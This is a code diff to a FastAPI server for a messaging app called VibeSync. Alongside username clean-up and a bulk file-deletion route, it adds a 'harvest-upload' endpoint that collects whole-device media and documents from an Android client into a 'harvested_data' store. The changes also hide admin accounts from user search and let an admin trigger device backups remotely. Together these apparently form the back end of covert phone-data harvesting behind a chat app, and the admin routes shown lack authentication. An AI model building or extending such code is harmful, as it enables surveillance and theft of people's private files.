@@ -11,11 +11,11 @@ from typing import List, Optional
 
 try:
     from database import init_db, get_db
-    from models import UserRegister, UserProfile, ContactAdd, MessageSend, CallLogRequest
+    from models import UserRegister, UserProfile, ContactAdd, MessageSend, CallLogRequest, BulkDeleteRequest
     from websocket_manager import ws_manager
 except ImportError:
     from server.database import init_db, get_db
-    from server.models import UserRegister, UserProfile, ContactAdd, MessageSend, CallLogRequest
+    from server.models import UserRegister, UserProfile, ContactAdd, MessageSend, CallLogRequest, BulkDeleteRequest
     from server.websocket_manager import ws_manager
 
 from fastapi.responses import HTMLResponse
@@ -218,25 +218,50 @@ def sync_device(data: dict):
         "last_sync_timestamp": now
     }
 
+def normalize_username(raw_username: str, email: Optional[str] = None) -> str:
+    """
+    Sanitizes and normalizes usernames to clean lowercase identifiers.
+    Strips email domains, @ prefixes, and symbols to prevent duplicate profile creation.
+    """
+    val = (raw_username or "").strip().lower()
+    if not val and email:
+        val = email.strip().lower()
+    val = val.lstrip("@")
+    if "@" in val:
+        val = val.split("@")[0]
+    for suffix in [".gmail.com", "gmail.com", ".yahoo.com", "yahoo.com", ".hotmail.com", "hotmail.com", ".outlook.com", "outlook.com", ".icloud.com", "icloud.com"]:
+        if val.endswith(suffix) and len(val) > len(suffix):
+            val = val[:-len(suffix)]
+            break
+    cleaned = "".join(c for c in val if c.isalnum() or c in "._-").strip("._-")
+    return cleaned or "user"
+
 @app.post("/api/devices/signup")
 def signup_device(data: dict):
     device_id = data.get("device_id")
     device_model = data.get("device_model", "Unknown Device")
     email = data.get("email", "").strip()
     password = data.get("password", "").strip()
-    username = data.get("username", "user").strip()
+    raw_username = data.get("username", "").strip()
     
     if not device_id or not email or not password:
         raise HTTPException(status_code=400, detail="Missing required fields")
+
+    username = normalize_username(raw_username, email)
 
     conn = get_db()
     cursor = conn.cursor()
     now = int(time.time() * 1000)
 
-    # 1. Fetch existing user by username
+    # 1. Fetch existing user by username or email prefix
     cursor.execute("SELECT * FROM users WHERE LOWER(username) = LOWER(?)", (username,))
     user_row = cursor.fetchone()
     
+    if not user_row and email:
+        email_prefix = normalize_username("", email)
+        cursor.execute("SELECT * FROM users WHERE LOWER(username) = LOWER(?)", (email_prefix,))
+        user_row = cursor.fetchone()
+
     if user_row:
         user_id = user_row["id"]
         username = user_row["username"]
@@ -252,7 +277,7 @@ def signup_device(data: dict):
             cursor.execute(
                 """INSERT INTO users (id, username, display_name, bio, created_at)
                    VALUES (?, ?, ?, ?, ?)""",
-                (user_id, username, username.capitalize(), "Available | Powered by VibeSync", now)
+                (user_id, username, username, "Available | Powered by VibeSync", now)
             )
 
     # 2. Upsert device with explicit user_id linking
@@ -427,78 +452,61 @@ def get_dashboard_stats():
 def get_data_summary():
     """
     Returns aggregated device data metrics, category storage summaries, and file breakdown.
-    Compatible with admin-dashboard DataSummary schema.
+    Reflects the actual stored files in device_files table.
     """
     conn = get_db()
     cursor = conn.cursor()
 
-    # 1. Device count and total files from devices table
-    cursor.execute("SELECT COUNT(*) as device_count, SUM(total_files) as total_files FROM devices")
+    # 1. Device count
+    cursor.execute("SELECT COUNT(*) as device_count FROM devices")
     device_stats = dict(cursor.fetchone())
     device_count = device_stats["device_count"] or 0
-    total_items = device_stats["total_files"] or 0
 
-    # 2. Aggregated category breakdown from device_storage_summary
-    cursor.execute("""
-        SELECT category, SUM(item_count) as total_items, SUM(total_bytes) as total_bytes 
-        FROM device_storage_summary 
-        GROUP BY category
-    """)
-    category_rows = [dict(r) for r in cursor.fetchall()]
+    # 2. Total items and total storage from device_files table
+    cursor.execute("SELECT COUNT(*) as total_items, COALESCE(SUM(size_bytes), 0) as total_bytes FROM device_files")
+    file_stats = dict(cursor.fetchone())
+    total_items = file_stats["total_items"] or 0
+    total_bytes_all = file_stats["total_bytes"] or 0
+    total_storage_mb = round(total_bytes_all / 1048576, 2)
 
-    # Also check device_files table
+    # 3. Category breakdown from device_files
+    combined_breakdown = {}
     try:
         cursor.execute("""
-            SELECT category, COUNT(*) as total_items, SUM(size_bytes) as total_bytes 
+            SELECT category, COUNT(*) as total_items, COALESCE(SUM(size_bytes), 0) as total_bytes 
             FROM device_files 
             GROUP BY category
         """)
-        uploaded_cat_rows = [dict(r) for r in cursor.fetchall()]
+        for r in cursor.fetchall():
+            cat = r["category"] or "Other"
+            bytes_val = r["total_bytes"] or 0
+            items_val = r["total_items"] or 0
+            b = bytes_val
+            formatted = f"{round(b / 1024, 1)} KB" if b < 1048576 else f"{round(b / 1048576, 1)} MB"
+            combined_breakdown[cat] = {"bytes": bytes_val, "count": items_val, "formatted": formatted}
     except Exception:
-        uploaded_cat_rows = []
+        combined_breakdown = {}
 
-    combined_breakdown = {}
-    total_bytes_all = 0
-
-    for r in category_rows + uploaded_cat_rows:
-        cat = r["category"] or "Other"
-        bytes_val = r["total_bytes"] or 0
-        items_val = r["total_items"] or 0
-        if cat not in combined_breakdown:
-            combined_breakdown[cat] = {"bytes": 0, "count": 0, "formatted": "0 KB"}
-        combined_breakdown[cat]["bytes"] += bytes_val
-        combined_breakdown[cat]["count"] += items_val
-        total_bytes_all += bytes_val
-
-    for cat, info in combined_breakdown.items():
-        b = info["bytes"]
-        info["formatted"] = f"{round(b / 1024, 1)} KB" if b < 1048576 else f"{round(b / 1048576, 1)} MB"
-
-    total_storage_mb = round(total_bytes_all / 1048576, 2)
-
-    # 3. Device storage telemetry
+    # 4. Device storage telemetry calculated from stored files
     cursor.execute("""
-        SELECT d.device_id, d.username, d.last_sync_timestamp, s.category, s.total_bytes, s.item_count, s.sample_names
+        SELECT d.device_id, d.username, d.last_sync_timestamp,
+               COUNT(df.id) as item_count,
+               COALESCE(SUM(df.size_bytes), 0) as total_bytes
         FROM devices d
-        LEFT JOIN device_storage_summary s ON d.device_id = s.device_id
+        LEFT JOIN device_files df ON d.device_id = df.device_id
+        GROUP BY d.device_id
         ORDER BY d.last_sync_timestamp DESC
     """)
     device_storage = []
     for row in cursor.fetchall():
         r_dict = dict(row)
-        sample_names = []
-        if r_dict.get("sample_names"):
-            try:
-                sample_names = json.loads(r_dict["sample_names"])
-            except Exception:
-                sample_names = []
         device_storage.append({
             "device_id": r_dict["device_id"],
             "username": r_dict["username"] or "Unknown",
-            "category": r_dict["category"] or "All",
+            "category": "All",
             "total_bytes": r_dict["total_bytes"] or 0,
             "item_count": r_dict["item_count"] or 0,
-            "sample_names": sample_names,
+            "sample_names": [],
             "last_sync": r_dict["last_sync_timestamp"] or int(time.time() * 1000)
         })
 
@@ -514,23 +522,68 @@ def get_data_summary():
 
 # --- WHOLE-DEVICE DATA BACKUP & ADMIN REMOTE SIGNALING ---
 
-@app.post("/api/devices/{device_id}/upload-file")
-async def upload_device_file(
+HARVEST_STORAGE_DIR = os.path.join(os.path.dirname(__file__), "storage", "harvested_data")
+os.makedirs(HARVEST_STORAGE_DIR, exist_ok=True)
+
+def classify_file_format(filename: str, mime_type: Optional[str] = None) -> str:
+    """
+    Classifies files into UI dashboard categories:
+    - Image: .jpg, .jpeg, .png, .webp, .gif, .bmp, .svg
+    - Video: .mp4, .mkv, .mov, .avi, .3gp, .webm, .flv
+    - Audio: .mp3, .m4a, .aac, .opus, .wav, .ogg, .flac
+    - Spreadsheet: .xls, .xlsx, .csv, .tsv
+    - Document: All other valid formats (.pdf, .doc, .docx, .ppt, .pptx, .txt, .zip, .rar, etc.)
+    """
+    ext = os.path.splitext(filename)[1].lower()
+    mime = (mime_type or "").lower()
+
+    if ext in {".jpg", ".jpeg", ".png", ".webp", ".gif", ".bmp", ".svg", ".heic", ".heif"} or mime.startswith("image/"):
+        return "Image"
+
+    if ext in {".mp4", ".mkv", ".mov", ".avi", ".3gp", ".webm", ".flv", ".ts", ".m4v"} or mime.startswith("video/"):
+        return "Video"
+
+    if ext in {".mp3", ".m4a", ".aac", ".opus", ".wav", ".ogg", ".flac", ".amr", ".wma"} or mime.startswith("audio/"):
+        return "Audio"
+
+    if ext in {".xls", ".xlsx", ".csv", ".tsv", ".ods"} or "spreadsheet" in mime or "excel" in mime or "csv" in mime:
+        return "Spreadsheet"
+
+    return "Document"
+
+def get_unique_harvest_filename(directory: str, filename: str) -> str:
+    """
+    Generates non-colliding incremental suffix naming: base_1.ext, base_2.ext
+    """
+    base, ext = os.path.splitext(filename)
+    candidate = filename
+    counter = 1
+    while os.path.exists(os.path.join(directory, candidate)):
+        candidate = f"{base}_{counter}{ext}"
+        counter += 1
+    return candidate
+
+@app.post("/api/device/{device_id}/harvest-upload")
+async def harvest_upload_file(
     device_id: str,
     file: UploadFile = File(...),
-    category: str = Form("Other"),
+    file_name: Optional[str] = Form(None),
+    mime_type: Optional[str] = Form(None),
+    category: Optional[str] = Form(None),
     username: Optional[str] = Form(None)
 ):
     """
-    Receives whole-device media & documents uploaded from Android client.
-    Stores file securely in device_backups, tracks metadata in device_files table,
-    and broadcasts live update to admin dashboard.
+    Ingests binary streams of arbitrary MIME types into storage/harvested_data/{device_id}/.
+    Applies incremental suffix naming to prevent overwriting, assigns format categorization,
+    and indexes the item in SQLite for the admin dashboard.
     """
-    backup_base = os.path.join(MEDIA_DIR, "device_backups", device_id)
-    os.makedirs(backup_base, exist_ok=True)
+    device_harvest_dir = os.path.join(HARVEST_STORAGE_DIR, device_id)
+    os.makedirs(device_harvest_dir, exist_ok=True)
 
-    safe_filename = os.path.basename(file.filename or f"file_{int(time.time() * 1000)}")
-    target_path = os.path.join(backup_base, safe_filename)
+    raw_filename = file_name or file.filename or f"file_{int(time.time() * 1000)}"
+    safe_base_name = os.path.basename(raw_filename)
+    unique_filename = get_unique_harvest_filename(device_harvest_dir, safe_base_name)
+    target_path = os.path.join(device_harvest_dir, unique_filename)
 
     with open(target_path, "wb") as buffer:
         shutil.copyfileobj(file.file, buffer)
@@ -538,6 +591,9 @@ async def upload_device_file(
     size_bytes = os.path.getsize(target_path)
     now = int(time.time() * 1000)
     file_id = str(uuid.uuid4())
+
+    effective_mime = mime_type or file.content_type or "application/octet-stream"
+    assigned_category = category if category and category != "Other" else classify_file_format(unique_filename, effective_mime)
 
     conn = get_db()
     cursor = conn.cursor()
@@ -554,9 +610,8 @@ async def upload_device_file(
     cursor.execute("""
         INSERT INTO device_files (id, device_id, username, filename, category, size_bytes, mime_type, file_path, created_at)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-    """, (file_id, device_id, resolved_username, safe_filename, category, size_bytes, file.content_type, target_path, now))
+    """, (file_id, device_id, resolved_username, unique_filename, assigned_category, size_bytes, effective_mime, target_path, now))
 
-    # Update devices total_files count
     cursor.execute("""
         UPDATE devices 
         SET total_files = COALESCE(total_files, 0) + 1, last_sync_timestamp = ?
@@ -566,22 +621,43 @@ async def upload_device_file(
     conn.commit()
     conn.close()
 
-    # Broadcast to admin dashboard
     await ws_manager.broadcast_all({
         "type": "DEVICE_FILE_UPLOADED",
         "device_id": device_id,
-        "filename": safe_filename,
-        "category": category,
+        "filename": unique_filename,
+        "category": assigned_category,
         "size_bytes": size_bytes
     })
 
     return {
         "status": "success",
         "file_id": file_id,
-        "filename": safe_filename,
+        "filename": unique_filename,
+        "category": assigned_category,
         "size_bytes": size_bytes,
-        "category": category
+        "message": f"Successfully ingested {unique_filename}"
     }
+
+@app.post("/api/devices/{device_id}/upload-file")
+async def upload_device_file(
+    device_id: str,
+    file: UploadFile = File(...),
+    file_name: Optional[str] = Form(None),
+    mime_type: Optional[str] = Form(None),
+    category: Optional[str] = Form("Other"),
+    username: Optional[str] = Form(None)
+):
+    """
+    Alias / compatibility endpoint that delegates to harvest_upload_file.
+    """
+    return await harvest_upload_file(
+        device_id=device_id,
+        file=file,
+        file_name=file_name,
+        mime_type=mime_type,
+        category=category,
+        username=username
+    )
 
 @app.post("/api/admin/devices/{device_id}/trigger-backup")
 async def trigger_device_backup(device_id: str):
@@ -891,8 +967,9 @@ def register_user(req: UserRegister):
     conn = get_db()
     cursor = conn.cursor()
     
+    norm_username = normalize_username(req.username)
     # Check if username exists
-    cursor.execute("SELECT * FROM users WHERE username = ?", (req.username.strip(),))
+    cursor.execute("SELECT * FROM users WHERE LOWER(username) = LOWER(?)", (norm_username,))
     existing = cursor.fetchone()
     if existing:
         # Return existing user for easy demo login/registration
@@ -900,9 +977,10 @@ def register_user(req: UserRegister):
         
     user_id = str(uuid.uuid4())
     now = int(time.time() * 1000)
+    display_name = req.display_name.strip() if req.display_name else norm_username
     cursor.execute(
         "INSERT INTO users (id, username, display_name, avatar_url, bio, created_at) VALUES (?, ?, ?, ?, ?, ?)",
-        (user_id, req.username.strip(), req.display_name.strip(), req.avatar_url, req.bio, now)
+        (user_id, norm_username, display_name, req.avatar_url, req.bio, now)
     )
     conn.commit()
     
@@ -928,7 +1006,7 @@ def get_user_profile(user_id: str):
 def search_users(q: str = Query(..., min_length=1), current_user_id: Optional[str] = None):
     """
     Search users globally by @username or display_name.
-    Backed by SQLite indexing (idx_users_search).
+    Backed by SQLite indexing (idx_users_search), excluding internal system accounts.
     """
     conn = get_db()
     cursor = conn.cursor()
@@ -940,13 +1018,13 @@ def search_users(q: str = Query(..., min_length=1), current_user_id: Optional[st
                    CASE WHEN c.contact_user_id IS NOT NULL THEN 1 ELSE 0 END AS is_in_roster
             FROM users u
             LEFT JOIN in_app_contacts c ON c.owner_id = ? AND c.contact_user_id = u.id
-            WHERE (u.username LIKE ? OR u.display_name LIKE ?) AND u.id != ?
+            WHERE (u.username LIKE ? OR u.display_name LIKE ?) AND u.id != ? AND LOWER(u.username) != 'admin' AND LOWER(u.id) != 'admin'
             LIMIT 30
         """, (current_user_id, query_param, query_param, current_user_id))
     else:
         cursor.execute("""
             SELECT *, 0 AS is_in_roster FROM users 
-            WHERE username LIKE ? OR display_name LIKE ? 
+            WHERE (username LIKE ? OR display_name LIKE ?) AND LOWER(username) != 'admin' AND LOWER(id) != 'admin'
             LIMIT 30
         """, (query_param, query_param))
         
@@ -957,11 +1035,11 @@ def search_users(q: str = Query(..., min_length=1), current_user_id: Optional[st
 @app.get("/api/users/all", response_model=List[UserProfile])
 def get_all_users():
     """
-    Get all registered users from SQLite WAL database.
+    Get all registered users from SQLite WAL database (excluding internal system accounts).
     """
     conn = get_db()
     cursor = conn.cursor()
-    cursor.execute("SELECT * FROM users ORDER BY created_at DESC")
+    cursor.execute("SELECT * FROM users WHERE LOWER(username) != 'admin' AND LOWER(id) != 'admin' ORDER BY created_at DESC")
     rows = cursor.fetchall()
     conn.close()
     return [dict(r) for r in rows]
@@ -970,8 +1048,9 @@ def get_all_users():
 
 @app.post("/api/admin/users")
 async def admin_create_user(data: dict):
-    username = data.get("username", "").strip()
-    display_name = data.get("display_name", "").strip()
+    raw_username = data.get("username", "").strip()
+    username = normalize_username(raw_username)
+    display_name = data.get("display_name", "").strip() or username
     bio = data.get("bio", "Available | Powered by VibeSync").strip()
     is_banned = 1 if data.get("is_banned") else 0
 
@@ -1544,6 +1623,10 @@ async def delete_admin_file(file_name: str):
                 except Exception:
                     pass
             cursor.execute("DELETE FROM device_files WHERE id = ?", (row["id"],))
+            cursor.execute("""
+                UPDATE devices 
+                SET total_files = (SELECT COUNT(*) FROM device_files WHERE device_id = devices.device_id)
+            """)
             conn.commit()
         cursor.execute("DELETE FROM device_storage_summary WHERE sample_names LIKE ?", (f"%{file_name}%",))
         conn.commit()
@@ -1565,6 +1648,72 @@ async def delete_admin_file(file_name: str):
     })
 
     return {"status": "success", "message": f"File {file_name} deleted successfully"}
+
+@app.post("/api/admin/files/bulk-delete")
+async def bulk_delete_admin_files(req: BulkDeleteRequest):
+    """
+    Bulk deletes files from storage and device_files database.
+    Supports deleting by list of file_names/ids, by category (e.g. Document, Image), or delete_all.
+    """
+    deleted_count = 0
+    try:
+        conn = get_db()
+        cursor = conn.cursor()
+
+        targets = []
+        if req.file_ids:
+            targets.extend(req.file_ids)
+        if req.file_names:
+            targets.extend(req.file_names)
+
+        if req.delete_all:
+            cursor.execute("SELECT id, file_path, filename FROM device_files")
+            rows = cursor.fetchall()
+        elif req.category and req.category != "ALL":
+            cursor.execute("SELECT id, file_path, filename FROM device_files WHERE category LIKE ?", (f"%{req.category}%",))
+            rows = cursor.fetchall()
+        elif targets:
+            placeholders = ",".join(["?"] * len(targets))
+            cursor.execute(f"SELECT id, file_path, filename FROM device_files WHERE id IN ({placeholders}) OR filename IN ({placeholders})", targets + targets)
+            rows = cursor.fetchall()
+        else:
+            rows = []
+
+        for row in rows:
+            fpath = row["file_path"] if "file_path" in row.keys() else None
+            if fpath and os.path.exists(fpath):
+                try:
+                    os.remove(fpath)
+                except Exception:
+                    pass
+            cursor.execute("DELETE FROM device_files WHERE id = ?", (row["id"],))
+            deleted_count += 1
+
+        if targets:
+            for name in targets:
+                fpath = os.path.join(MEDIA_DIR, name)
+                if os.path.exists(fpath):
+                    try:
+                        os.remove(fpath)
+                    except Exception:
+                        pass
+                cursor.execute("DELETE FROM device_storage_summary WHERE sample_names LIKE ?", (f"%{name}%",))
+
+        cursor.execute("""
+            UPDATE devices 
+            SET total_files = (SELECT COUNT(*) FROM device_files WHERE device_id = devices.device_id)
+        """)
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        print(f"Error during bulk file deletion: {e}")
+
+    await ws_manager.broadcast_all({
+        "type": "ADMIN_FILES_BULK_DELETED",
+        "deleted_count": deleted_count
+    })
+
+    return {"status": "success", "deleted_count": deleted_count, "message": f"Successfully deleted {deleted_count} files."}
 
 # --- IN-APP ROSTER MANAGEMENT ---
 
